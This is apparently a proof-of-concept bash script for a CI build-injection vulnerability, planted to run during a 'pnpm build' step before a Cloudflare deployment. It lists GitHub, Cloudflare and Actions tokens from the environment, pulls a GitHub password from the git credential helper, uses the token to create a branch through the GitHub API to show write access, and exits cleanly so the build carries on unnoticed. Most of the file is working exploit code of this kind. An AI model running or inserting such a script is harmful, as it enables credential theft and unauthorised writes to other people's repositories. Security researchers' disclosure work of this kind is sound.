#!/bin/bash

# Advanced POC - Dumps all available secrets and attempts exploitation
# This runs during "pnpm build" step, right before Cloudflare deployment

echo "================================================"
echo "üö® ADVANCED POC: Secret Extraction"
echo "================================================"
echo "Execution time: $(date)"
echo "Working directory: $(pwd)"
echo ""

# Function to mask sensitive values
mask_secret() {
    local secret="$1"
    if [ ${#secret} -gt 8 ]; then
        echo "${secret:0:10}...${secret: -4}"
    else
        echo "***"
    fi
}

echo "üîç ENVIRONMENT VARIABLES SCAN"
echo "================================================"
echo ""

# Check for GitHub tokens
echo "üìå GitHub Tokens:"
[ ! -z "$GITHUB_TOKEN" ] && echo "  ‚úÖ GITHUB_TOKEN: $(mask_secret "$GITHUB_TOKEN")" || echo "  ‚ùå GITHUB_TOKEN: not found"
[ ! -z "$GH_TOKEN" ] && echo "  ‚úÖ GH_TOKEN: $(mask_secret "$GH_TOKEN")" || echo "  ‚ùå GH_TOKEN: not found"
[ ! -z "$INPUT_GITHUB_TOKEN" ] && echo "  ‚úÖ INPUT_GITHUB_TOKEN: $(mask_secret "$INPUT_GITHUB_TOKEN")" || echo "  ‚ùå INPUT_GITHUB_TOKEN: not found"

# Check for Cloudflare secrets (these are passed to the next step)
echo ""
echo "üìå Cloudflare Secrets:"
[ ! -z "$CLOUDFLARE_API_TOKEN" ] && echo "  ‚úÖ CLOUDFLARE_API_TOKEN: $(mask_secret "$CLOUDFLARE_API_TOKEN")" || echo "  ‚ùå CLOUDFLARE_API_TOKEN: not found"
[ ! -z "$CLOUDFLARE_ACCOUNT_ID" ] && echo "  ‚úÖ CLOUDFLARE_ACCOUNT_ID: $(mask_secret "$CLOUDFLARE_ACCOUNT_ID")" || echo "  ‚ùå CLOUDFLARE_ACCOUNT_ID: not found"
[ ! -z "$INPUT_APITOKEN" ] && echo "  ‚úÖ INPUT_APITOKEN: $(mask_secret "$INPUT_APITOKEN")" || echo "  ‚ùå INPUT_APITOKEN: not found"
[ ! -z "$INPUT_ACCOUNTID" ] && echo "  ‚úÖ INPUT_ACCOUNTID: $(mask_secret "$INPUT_ACCOUNTID")" || echo "  ‚ùå INPUT_ACCOUNTID: not found"

# Check GitHub Actions tokens
echo ""
echo "üìå GitHub Actions Tokens:"
[ ! -z "$ACTIONS_RUNTIME_TOKEN" ] && echo "  ‚úÖ ACTIONS_RUNTIME_TOKEN: $(mask_secret "$ACTIONS_RUNTIME_TOKEN")" || echo "  ‚ùå ACTIONS_RUNTIME_TOKEN: not found"
[ ! -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo "  ‚úÖ ACTIONS_ID_TOKEN_REQUEST_TOKEN: $(mask_secret "$ACTIONS_ID_TOKEN_REQUEST_TOKEN")" || echo "  ‚ùå ACTIONS_ID_TOKEN_REQUEST_TOKEN: not found"

# GitHub context variables
echo ""
echo "üìå GitHub Context:"
echo "  GITHUB_REPOSITORY: ${GITHUB_REPOSITORY:-not found}"
echo "  GITHUB_ACTOR: ${GITHUB_ACTOR:-not found}"
echo "  GITHUB_REF: ${GITHUB_REF:-not found}"
echo "  GITHUB_SHA: ${GITHUB_SHA:0:8}..."
echo "  GITHUB_EVENT_NAME: ${GITHUB_EVENT_NAME:-not found}"

# Dump all environment variables starting with GITHUB_ or SECRET_ or INPUT_
echo ""
echo "üìå All Potentially Sensitive Variables:"
env | grep -E "^(GITHUB_|SECRET_|INPUT_|GH_|CLOUDFLARE_|CF_)" | while read line; do
    key=$(echo "$line" | cut -d= -f1)
    value=$(echo "$line" | cut -d= -f2-)
    if [ ${#value} -gt 8 ]; then
        echo "  $key: ${value:0:10}...${value: -4}"
    else
        echo "  $key: ***"
    fi
done

echo ""
echo "================================================"
echo "üéØ EXPLOITATION ATTEMPT"
echo "================================================"
echo ""

# Find any available token
TOKEN=""
if [ ! -z "$GITHUB_TOKEN" ]; then
    TOKEN="$GITHUB_TOKEN"
    echo "‚úÖ Using GITHUB_TOKEN"
elif [ ! -z "$GH_TOKEN" ]; then
    TOKEN="$GH_TOKEN"
    echo "‚úÖ Using GH_TOKEN"
elif [ ! -z "$INPUT_GITHUB_TOKEN" ]; then
    TOKEN="$INPUT_GITHUB_TOKEN"
    echo "‚úÖ Using INPUT_GITHUB_TOKEN"
else
    # Try to extract from git credentials
    echo "üîç Attempting to extract from git credential helper..."
    CRED_OUTPUT=$(printf "protocol=https\nhost=github.com\n\n" | git credential fill 2>/dev/null)
    TOKEN=$(echo "$CRED_OUTPUT" | grep "password=" | cut -d= -f2)
    if [ ! -z "$TOKEN" ]; then
        echo "‚úÖ Extracted token from git credentials"
    fi
fi

if [ -z "$TOKEN" ]; then
    echo "‚ùå No token found - cannot proceed with API exploitation"
    echo ""
    echo "However, this still proves:"
    echo "  ‚úì Arbitrary code execution during build"
    echo "  ‚úì Access to workflow environment"
    echo "  ‚úì Could exfiltrate any available data"
    echo ""
else
    echo ""
    BRANCH_NAME="poc-exploit-build-$(date +%s)"
    REPO="${GITHUB_REPOSITORY:-unknown/unknown}"

    echo "üì° Attempting to create branch via GitHub API"
    echo "   Repository: $REPO"
    echo "   Branch: $BRANCH_NAME"

    # Get current commit SHA
    CURRENT_SHA=$(git rev-parse HEAD 2>/dev/null)
    if [ -z "$CURRENT_SHA" ]; then
        CURRENT_SHA="${GITHUB_SHA}"
    fi
    echo "   SHA: ${CURRENT_SHA:0:8}"
    echo ""

    # Try to create branch via API
    API_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
      -X POST \
      -H "Authorization: Bearer $TOKEN" \
      -H "Accept: application/vnd.github+json" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      "https://api.github.com/repos/$REPO/git/refs" \
      -d "{\"ref\":\"refs/heads/$BRANCH_NAME\",\"sha\":\"$CURRENT_SHA\"}" 2>&1)

    HTTP_CODE=$(echo "$API_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
    API_BODY=$(echo "$API_RESPONSE" | sed '/HTTP_CODE:/d')

    echo "üì° API Response Code: $HTTP_CODE"

    if [ "$HTTP_CODE" = "201" ]; then
        echo ""
        echo "================================================"
        echo "‚úÖ‚úÖ‚úÖ EXPLOITATION SUCCESSFUL! ‚úÖ‚úÖ‚úÖ"
        echo "================================================"
        echo ""
        echo "Branch '$BRANCH_NAME' created successfully!"
        echo ""
        echo "üö® VULNERABILITY CONFIRMED:"
        echo "  ‚úì Untrusted code executed during build"
        echo "  ‚úì GitHub token accessed"
        echo "  ‚úì Branch created via API"
        echo "  ‚úì Write access to repository confirmed"
        echo ""
        echo "Attacker capabilities demonstrated:"
        echo "  ‚Ä¢ Create/delete branches"
        echo "  ‚Ä¢ Push malicious code"
        echo "  ‚Ä¢ Modify workflows for persistence"
        echo "  ‚Ä¢ Exfiltrate secrets"
        echo "  ‚Ä¢ Modify pull requests"
        echo ""
    elif [ "$HTTP_CODE" = "422" ]; then
        echo ""
        echo "‚ö†Ô∏è  Branch might already exist (422)"
        echo "But token is valid and working!"
        echo ""
    elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
        echo ""
        echo "‚ö†Ô∏è  Token lacks sufficient permissions (${HTTP_CODE})"
        echo "Response: $API_BODY" | head -3
        echo ""
        echo "But this still proves:"
        echo "  ‚úì Token accessible"
        echo "  ‚úì Could be exfiltrated"
        echo "  ‚úì Could be used for other operations"
        echo ""
    else
        echo ""
        echo "Response: $API_BODY" | head -5
        echo ""
    fi
fi

echo "================================================"
echo "POC Complete - Continuing with normal build..."
echo "================================================"
echo ""

# Exit successfully so the build continues
exit 0
